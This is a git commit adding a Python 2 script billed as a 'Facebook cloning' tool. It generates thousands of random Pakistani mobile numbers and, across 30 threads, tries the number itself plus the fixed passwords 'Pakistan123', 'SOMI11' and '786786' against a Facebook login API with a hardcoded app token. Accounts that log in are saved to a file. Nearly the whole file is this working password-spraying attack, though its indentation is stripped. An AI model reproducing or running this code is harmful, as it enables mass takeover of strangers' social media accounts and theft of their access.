c7539dd1ce809379806ae6f2203badf57f84a56c
Faizulboften <72049391+Faizulboften@users.noreply.github.com>
2020-10-06 04:22:33 +0800

    Add files via upload

---
+++ Enjoy.py
@@ -0,0 +1,347 @@
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(10000):
+nmbr = random.randint(1111111, 9999999)
+sys.stdout = open('.txt', 'a')
+print(nmbr)
+sys.stdout.flush()
+try:
+import requests
+except ImportError:
+os.system('pip2 install mechanize')
+try:
+import mechanize
+except ImportError:
+os.system('pip2 install request')
+time.sleep(1)
+os.system('Then type: python2 boss')
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+def keluar():
+print 'Thanks.'
+os.sys.exit()
+def acak(b):
+w = 'ahtdzjc'
+d = ''
+for i in x:
+d += '!'+w[random.randint(0,len(w)-1)]+i
+return cetak(d)
+def cetak(b):
+w = 'ahtdzjc'
+for i in w:
+j = w.index(i)
+x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+x += '\033[0m'
+x = x.replace('!0','\033[0m')
+sys.stdout.write(x+'\n')
+def jalan(z):
+for e in z + '\n':
+sys.stdout.write(e)
+sys.stdout.flush()
+time.sleep(00000.1)
+def tik():
+titik = ['.   ','..  ','... ']
+for o in titik:
+print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+os.system("clear")
+print  """
+\n\t\033[90m~  ~  ~\033[92m┌∩┐\033[94m(\033[91m◣_◢\033[94m)\033[92m┌∩┐\033[90m~  ~  ~
+\t\033[00m FACEBOOK CLONING BY FAIZUL V9
+\t\033[90m -----------------------\033[94m\n
+\033[1;92m---------------------��NOTE---------------------
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;96mJANGAN RECODE CUK / SCRIP CLON AKUN LUAR NO LOGIN ✔..
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;91mCREATOR
+🔘 [ FAIZUL BOFTEN ]
+\033[1;94mFACEBOOK
+🔘 [ FAIZUL ]
+\033[1;91mYOUTUBE
+🔘 [ HTC CTR GAMING ]
+\033[1;93mGITHUB
+🔘 [ FAIZULCYBER ]
+\033[1;92mWHATAAPP
+🔘 [ 082271426251 ]
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;96m✔ Gunakan dengan bijak sobat oke ✔..
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;92m--------------------✔CREATOR----------------------
+"""
+logo1 = """
+\n\t\033[90m~  ~  ~\033[92m┌∩┐\033[94m(\033[91m◣_◢\033[94m)\033[92m┌∩┐\033[90m~  ~  ~
+\t\033[00m FACEBOOK CLONE AKUN LUAR V9
+\t\033[90m -----------------------\033[94m\n
+\033[1;91m------------------🔴FAIZUL----------------------
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;96m✔ JANGAN RECODE / CREATOR FAIZUL ✔..
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;91mCREATOR
+🔘 [ FAIZUL BOFTEN ]
+\033[1;94mFACEBOOK
+🔘 [ FAIZUL ]
+\033[1;91mYOUTUBE
+🔘 [ HTC CTR GAMING ]
+\033[1;93mGITHUB
+🔘 [ FAIZULCYBER ]
+\033[1;92mWHATAAPP
+🔘 [ 082271426251 ]
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;96m✔ SCRIP DI BUAT UNTUK UJI COBA KEAMANAN ACCOUND✔..
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;95m-----------------��FAIZUL------------------------
+"""
+logo2 = """
+╭━┳━╭━╭━╮              FAIZUL BOFTEN
+┃┈┈┈┣▅╋▅┫┃             SCRIP CLON FACEBOOK
+┃┈┃┈╰━╰━━━━━━╮
+╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣       🔴INDONESIA
+╲┃┈┈┈┈┈┈┈┈┈┈▉▉▉       🔴SULTENG
+╲┃┈┈┈┈┈┈┈┈┈┈◥▉◤       🔴AMPANA KOTA
+╲┃┈┈┈┈╭━┳━━━━╯         ╦ ╦╦ ╦╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗ 🔓 082271426251
+╲┣━━━━━━┫               ║║║╠═╣╠═╣ ║ ╚═╗╠═╣╠═╝╠═╝
+╲┃┈┈┈┈┈┈┃               ╚╩╝╩ ╩╩ ╩ ╩ ╚═╝╩ ╩╩  ╩
+\033[1;91m---------------------��FAIZUL-------------------
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;96m🔓 YAA ALLAH AMUNILAH DOSA DOSA MEREKA🔓..
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;91mCREATOR
+🔘 [ FAIZUL BOFTEN ]
+\033[1;94mFACEBOOK
+🔘 [ FAIZUL ]
+\033[1;91mYOUTUBE
+🔘 [ HTC CTR GAMING ]
+\033[1;93mGITHUB
+🔘 [ FAIZULCYBER ]
+\033[1;92mWHATAAPP
+🔘 [ 082271426251 ]
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;96m✔ MASUKA UNSERNAME / ✔ PASSWORD..
+\033[1;97m═══════════════════════════════════════════════════════════
+\033[1;97m---------------------USER/PASS--------------------
+"""
+CorrectUsername = "FAIZUL"
+CorrectPassword = "BOFTEN"
+loop = 'true'
+while (loop == 'true'):
+username = raw_input("\033[1;97m\x1b[1;91mUsername \x1b[1;97m»» \x1b[1;97m")
+if (username == CorrectUsername):
+password = raw_input("\033[1;97m \x1b[1;91mPassword  \x1b[1;97m» \x1b[1;97m")
+if (password == CorrectPassword):
+print "Login sukses full " + username #Dev:love_hacker
+time.sleep(10)
+loop = 'false'
+else:
+print "\033[1;94mPassword Invalid"
+os.system('xdg-open https://www.facebook.com/profile.php?id=100027772032939')
+else:
+print "\033[1;94mUsername Invalid"
+os.system('xdg-open https://www.facebook.com/profile.php?id=100027772032939')
+def lisensi():
+os.system('clear')
+login()
+def login():
+os.system('clear')
+print logo1
+print "\033[1;91m[1]\x1b[1;91m✔LANJUT ( \033[1;92m NOW❌)"
+time.sleep(0.05)
+print "\033[1;95m[2]\x1b[1;93m🔘UPDATE (8.0)"
+time.sleep(0.05)
+print '\x1b[1;94m[0]\033[1;91m Exit❌ ( Back❌)'
+pilih_login()
+def pilih_login():
+peak = raw_input("\n\033[1;95m@Localhost: \033[1;93m")
+if peak =="":
+print "\x1b[1;97mFill In Correctly"
+pilih_login()
+elif peak =="1":
+Zeek()
+def Zeek():
+os.system('clear')
+print logo1
+print '\x1b[1;91m[1]  ✔START CLONING BY FAIZUL'
+time.sleep(0.10)
+print '\x1b[1;92m[2] ✔FAIZUL FB ACCOUND'
+time.sleep(0.10)
+print '\x1b[1;95m[3] ✔INFO TOOLS'
+time.sleep(0.10)
+print '\x1b[1;96m[4] ❌TRACKER'
+time.sleep(0.10)
+print '\x1b[1;97m[5] ❌CLONING ERROR'
+time.sleep(0.10)
+print '\x1b[1;91m[6] ❌FAIZUL FACEBOOK'
+time.sleep(0.10)
+print '\x1b[1;94m[0] EXIT/PROGRAN❌'
+time.sleep(0.05)
+action()
+def action():
+peak = raw_input('\n\033[1;97m@Localhost:\033[1;97m')
+if peak =='':
+print '[!] Fill In Correctly'
+action()
+elif peak =="1":
+os.system("clear")
+print logo2
+print "Enter Pakistan Kode Number"+'\n'
+print 'Enter any code 1 sampe 49'
+print 'telenor.jazz.zong.warid'
+try:
+c = raw_input("\033[1;97m@Localhost : ")
+k="03"
+idlist = ('.txt')
+for line in open(idlist,"r").readlines():
+id.append(line.strip())
+except IOError:
+print ("[!] File Not")
+raw_input("\n[ Kembali ]")
+blackmafiax()
+elif peak =='0':
+login()
+else:
+print '[!] Fill In Correctly'
+action()
+print 50* '\033[1;94m-'
+xxx = str(len(id))
+jalan ('\033[1;91m Total number: '+xxx)
+jalan ('\033[1;92mCode Localhost: '+c)
+jalan ("\033[1;93mMohon Tunggu lagi Cracking...")
+jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
+print 50* '\033[1;97m-'
+def main(arg):
+global cpb,oks
+user = arg
+try:
+os.mkdir('save')
+except OSError:
+pass
+try:
+pass1 = user
+data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+q = json.load(data)
+if 'access_token' in q:
+print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass1
+okb = open('save/cloned.txt', 'a')
+okb.write(k+c+user+pass1+'\n')
+okb.close()
+oks.append(c+user+pass1)
+else:
+if 'www.facebook.com' in q['error_msg']:
+print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass1
+cps = open('save/cloned.txt', 'a')
+cps.write(k+c+user+pass1+'\n')
+cps.close()
+cpb.append(c+user+pass1)
+else:
+pass2 = k + c + user
+data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+q = json.load(data)
+if 'access_token' in q:
+print '\x1b[1;93m(Enjoy)  ' + k + c + user +  '  |  ' + pass2
+okb = open('save/cloned.txt', 'a')
+okb.write(k+c+user+pass2+'\n')
+okb.close()
+oks.append(c+user+pass2)
+else:
+if 'www.facebook.com' in q['error_msg']:
+print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass2
+cps = open('save/cloned.txt', 'a')
+cps.write(k+c+user+pass2+'\n')
+cps.close()
+cpb.append(c+user+pass2)
+else:
+pass3="Pakistan123"
+data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+q = json.load(data)
+if 'access_token' in q:
+print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass3
+okb = open('save/cloned.txt', 'a')
+okb.write(k+c+user+pass3+'\n')
+okb.close()
+oks.append(c+user+pass3)
+else:
+if 'www.facebook.com' in q['error_msg']:
+print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass3
+cps = open('save/cloned.txt', 'a')
+cps.write(k+c+user+pass3+'\n')
+cps.close()
+cpb.append(c+user+pass3)
+else:
+pass4="SOMI11"
+data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+q = json.load(data)
+if 'access_token' in q:
+print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass4
+okb = open('save/cloned.txt', 'a')
+okb.write(k+c+user+pass4+'\n')
+okb.close()
+oks.append(c+user+pass4)
+else:
+if 'www.facebook.com' in q['error_msg']:
+print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass4
+cps = open('save/cloned.txt', 'a')
+cps.write(k+c+user+pass4+'\n')
+cps.close()
+cpb.append(c+user+pass4)
+else:
+pass5="786786"
+data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+q = json.load(data)
+if 'access_token' in q:
+print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass5
+okb = open('save/cloned.txt', 'a')
+okb.write(k+c+user+pass5+'\n')
+okb.close()
+oks.append(c+user+pass5)
+else:
+if 'www.facebook.com' in q['error_msg']:
+print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass5
+cps = open('save/cloned.txt', 'a')
+cps.write(k+c+user+pass5+'\n')
+cps.close()
+cpb.append(c+user+pass5)
+except:
+pass
+p = ThreadPool(30)
+p.map(main, id)
+print 50* '\033[1;91m-'
+print 'Process Has Been Sukses Cuk ...'
+print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
+print('Cloned Accounts Has Been Saved : save/cloned.txt')
+jalan("Note : Your Offline account Will Open after 10 to 20 days")
+print ''
+print """
+\n\t\033[90m~  ~  ~\033[92m┌∩┐\033[94m(\033[91m◣_◢\033[94m)\033[92m┌∩┐\033[90m~  ~  ~
+\t\033[00m FACEBOOK CLONING ✔
+\t\033[90m -----------------------\033[94m\n
+───────────────────────▄██▄▄██▄
+──────────────────────██████████
+──────────────────────▀████████▀
+────────────────────────▀████▀
+─────────────────────────████
+─────────────────────────████
+─────────────────────────████
+─────────────────────────████
+─────────────────────────████
+─────────────────────────████
+─────────────────────────████
+─────────────────────────████
+\033[1;95mFb\033[1;97mIzul
+\033[1;95myoutube\033[1;97mhttps://www.youtube.com/channel/UCSxkYGsMV5DvXz4GQJskl9Q"""
+raw_input("\n\033[1;92m[\033[1;92mKembali\033[1;95m]")
+login()
+if __name__ == '__main__':
+login()
